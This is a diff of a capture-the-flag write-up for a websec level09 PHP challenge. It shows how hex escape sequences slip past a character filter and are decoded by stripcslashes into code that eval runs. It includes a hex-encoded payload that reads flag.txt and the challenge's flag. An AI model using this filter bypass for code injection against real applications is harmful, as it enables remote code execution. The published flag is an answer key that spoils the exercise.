@@ -3,20 +3,51 @@ layout: default
 title: level09
 ---
 
-Here we can upload our own `cache_file`, and then it being saved in `/tmp/hash`. We can calculate the hash, using `sha1(time())`, and by this way know where our payload will be.
+Here we can upload our own `c`, and then it being saved in `/tmp/{something}`
+we get the something (which is `sha(time)`) using the `session_id` cookie.
 
-Then, we can see it strip slashes from our file, and then eval'ing it.
+If we wanna access the content, we just need to supply GET parameter `cache_file`, and point to the right file.
+
+Then, we can see it strip slashes from our file, and then eval it.
 ```php
 echo eval (stripcslashes (file_get_contents ($_GET['cache_file'])));
 ```
 
-I created some payload in hex, and added more `\` before every slash, and by this way, after the removing the code will be running.
+The problem is that it filters the content, and replace all with `''`
+```php
+$fh = fopen('/tmp/' . $randVal, 'w');
 
-Our python script:
-```py
-{% include_relative scripts/level09.py %}
+fwrite (
+    $fh,
+            str_replace (
+        ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
+        '',
+        $_GET['c']
+    )
+);
 ```
 
-### For some reason, it doesn't working, i need to check why. I fill like the session create isn't working
+And that's where `stripcslashes` enters, if it gets `\x41`, it translates it to `A`, like in C language.
+```php
+php > echo "\\x41";
+\x41
+php > echo stripcslashes("\\x41");
+A
+```
 
-**Flag:** ***`WEBSEC{}`*** 
+So, we'll use CyberChef to create our payload:
+```
+echo file_get_contents("flag.txt");
+```
+and we got:
+```
+\x65\x63\x68\x6f\x20\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x22\x66\x6c\x61\x67\x2e\x74\x78\x74\x22\x29\x3b
+```
+
+![cyberChef](./images/level09_cyberChef.png)
+
+Now, just send it using burp, take the `session_id` and send its path in `cache_file` parameter.
+ 
+![FINAL](./images/level09_FINAL.png)
+
+**Flag:** ***`WEBSEC{stripcslashes_to_bypass}`*** 
